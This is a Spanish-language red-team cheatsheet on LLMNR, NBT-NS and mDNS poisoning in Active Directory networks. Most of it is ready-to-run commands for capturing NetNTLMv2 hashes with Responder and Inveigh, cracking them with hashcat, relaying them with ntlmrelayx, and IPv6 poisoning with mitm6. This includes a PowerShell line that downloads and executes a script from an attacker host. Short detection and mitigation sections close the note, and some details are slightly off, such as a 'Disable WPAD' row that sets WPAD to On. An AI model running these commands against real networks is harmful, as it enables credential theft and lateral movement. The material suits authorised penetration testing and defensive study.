---
aliases:
  - LLMNR Poisoning
  - NBT-NS Poisoning
  - mDNS Poisoning
  - Name Resolution Poisoning
tags:
  - type/technique
  - technique/credential-access
  - technique/initial-access
  - env/windows
  - asset/active-directory
  - cred/ntlm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Credential Harvesting]]"
tertiary categories:
  - "[[Active Directory]]"
kind: Technique
linked:
  - "[[Active Directory Explotación]]"
  - "[[Responder]]"
  - "[[NTLM Relay]]"
  - "[[hashcat]]"
  - "[[Impacket Toolkit]]"
---
# LLMNR & NBT-NS Poisoning

***

## Cheatsheet
^llmnr-poisoning

| Paso | Comando |
| --- | --- |
| **Responder listener** | `sudo responder -I eth0 -wrf` |
| **Responder analyze** | `sudo responder -I eth0 -A` (passive) |
| **Inveigh (Win)** | `Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -Proxy Y` |
| **Crack NetNTLMv2** | `hashcat -m 5600 hashes.txt rockyou.txt` |
| **Disable WPAD** | `responder.conf`: `WPAD = On` para capturar `http://wpad/wpad.dat` |
| **Coerce via smbclient** | `smbclient -N \\\\NONEXISTENT\\share` → triggers LLMNR |

***

## Concepto

Cuando un Windows host resuelve un nombre no encontrado en DNS, falla-back a **LLMNR (UDP 5355)** → **NBT-NS (UDP 137)** → **mDNS (UDP 5353)**. Cualquier host en la VLAN puede responder "yo soy ese nombre" → víctima conecta y envía credenciales (NetNTLMv2 hash) al atacante.

Vectores típicos:
- Typo de share SMB (`\\FILESERVR` en vez de `\\FILESERVER`).
- WPAD auto-discovery (`wpad.dom.local` no existe → cada navegador pregunta).
- Recursos desconectados que siguen buscándose por scripts logon.
- Printer/share configs obsoletos.

**Resultado**: NetNTLMv2 hash crackeable offline o **relay** directo (ver [[NTLM Relay]]).

## Requisitos

- **Layer 2** al segmento víctima (VLAN, VPN, físico).
- LLMNR/NBT-NS/mDNS no deshabilitados via GPO.
- SMB signing **no requerido** para relay SMB (sí crackeable offline aunque esté required).
- Puerto 445 local libre (responder necesita bindear SMB).

## 1. Responder setup

### Config

```bash
# Linux — /etc/responder/Responder.conf o /usr/share/responder/Responder.conf
sudo vim /usr/share/responder/Responder.conf
```

Ajustes típicos:
```ini
[Responder Core]
SMB = On
HTTP = On
HTTPS = On
LDAP = On
WPAD = On              # capturar requests de WPAD
Challenge = 1122334455667788   # fijo → hashes rainbow-tableable
SessionLog = Responder-Session.log
```

Para **relay**: deshabilitar SMB y HTTP en Responder (liberar puertos para ntlmrelayx):
```ini
SMB = Off
HTTP = Off
```

### Correr

```bash
# Básico — todo default, capturar hashes
sudo responder -I eth0

# Flags útiles
sudo responder -I eth0 -wrf
#   -w WPAD rogue
#   -r NBT-NS answer
#   -f fingerprint OS víctimas

# Analyze mode (pasivo, sin responder) — solo listear qué pide la red
sudo responder -I eth0 -A

# Challenge fijo para hashes tableables
sudo responder -I eth0 --lm    # forzar LM challenge
```

Hashes se guardan en `/usr/share/responder/logs/` — `Responder-Session.log` + archivos por protocolo (`SMB-NTLMv2-SSP-...log`).

Format:
```
user::DOMAIN:1122334455667788:abc123...:01010000...
```

## 2. Inveigh (Windows on-host)

PowerShell analog de Responder — útil cuando atacante ya está en red interna desde Windows shell.

```powershell
# Cargar
iex (new-object net.webclient).downloadstring('http://atk/Inveigh.ps1')

# Básico
Invoke-Inveigh -ConsoleOutput Y

# Con todo habilitado
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -Proxy Y -SpooferHostsReply "FILESERVER,SHARE01"

# Capturar + deshabilitar spoof (analyze only)
Invoke-Inveigh -SpooferIP 0.0.0.0 -ConsoleOutput Y

# Leer hashes capturados
Get-Inveigh NTLMv2
```

C# version (binary, sin PowerShell):
```powershell
.\InveighZero.exe
```

## 3. Crack NetNTLMv2

```bash
# hashcat mode 5600
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Con rules
hashcat -m 5600 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# john
john --format=netntlmv2 --wordlist=rockyou.txt hashes.txt
```

Hash format esperado (challenge fijo `1122334455667788`):
```
user::DOMAIN:1122334455667788:abc...:01010000...
```

## 4. NTLM Relay (no crackeable → relay directo)

Si LLMNR capture falla cracking (pwd complejo), **relay** el hash en tiempo real a otro target:

```bash
# Responder: disable SMB/HTTP
# Responder.conf: SMB = Off, HTTP = Off

# Terminal 1 — ntlmrelayx
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -socks -of loot

# Terminal 2 — Responder solo para poisoning
sudo responder -I eth0 -rv
```

Ver [[NTLM Relay]] para chains completos (LDAP → RBCD, HTTP → ADCS ESC8, SMB → psexec).

## 5. Forzar resoluciones

En vez de esperar typos random, **coercer** queries:

```bash
# Crear query LLMNR artificial (rarely needed — ya pasa orgánicamente)
# Víctima conecta a nombre inexistente:
smbclient -N '\\NONEXISTENT\share'
# → si responder listening, captura hash del user quickly

# Via script en share SMB (RCE ya obtenido en otro host)
echo '\\attacker\bait' > trigger.lnk
# Hosts que listen el share → auto-resolve
```

## 6. Bypass WPAD → creds directos

Si responder `WPAD = On` + víctima pide `http://wpad/wpad.dat`:

```bash
# Responder sirve PAC file malicioso
# Víctima intenta auth via proxy → envía NetNTLMv2 a responder
# Chrome/Edge manda creds automático (intranet zone)
```

## 7. Herramientas auxiliares

| Tool | Uso |
| --- | --- |
| `metasploit auxiliary/spoof/llmnr/llmnr_response` | MSF version de responder. |
| `metasploit auxiliary/spoof/nbns/nbns_response` | NBT-NS spoof MSF. |
| `impacket-smbserver share /tmp/loot -smb2support` | Fake SMB share sin Responder full. |
| `mitm6` | **IPv6 DHCP poison** + DNS spoof — bypass más silencioso que LLMNR. Ver abajo. |

### mitm6 (mejor en 2025 — LLMNR está muriendo)

```bash
# IPv6 DHCPv6 poison → set attacker como DNS IPv6 default
sudo mitm6 -d dom.local --no-ra

# Combinar con ntlmrelayx para LDAP/LDAPS relay
sudo impacket-ntlmrelayx -6 -t ldaps://dc --delegate-access --no-smb-server -wh fakewpad.dom.local
```

Ventaja: **Windows prefiere IPv6 sobre IPv4**, y IPv6 está casi siempre enabled + unconfigured. mitm6 funciona donde LLMNR está disabled por GPO.

## Opsec / detecciones

- **Event 4648** (logon using explicit creds) con cuenta anómala.
- **Event 5145** (SMB access) a shares atacante-fake.
- Traffic profiling: burst de UDP 5355/137 responses desde un solo host.
- Inveigh/Responder tienen default challenge `1122334455667788` — detectable en PCAP (randomize via config).

## Mitigaciones

- **Deshabilitar LLMNR** por GPO: `Computer Configuration → Policies → Administrative Templates → Network → DNS Client → Turn off multicast name resolution = Enabled`.
- **Deshabilitar NBT-NS** en cada NIC (no hay GPO directo, requiere script PowerShell).
- **SMB signing required** — evita relay SMB.
- **LDAP channel binding + signing** — evita relay LDAP.
- **mitm6 mitigation**: deshabilitar IPv6 si no se usa, o ajustar preference IPv4 > IPv6.
- **Monitor**: LLMNR en DNS logs / Sysmon event 3 (network connection).

## Recursos

- [Responder GitHub](https://github.com/lgandx/Responder)
- [Inveigh GitHub](https://github.com/Kevin-Robertson/Inveigh)
- [mitm6](https://github.com/dirkjanm/mitm6)
- [HackTricks - LLMNR](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)

***
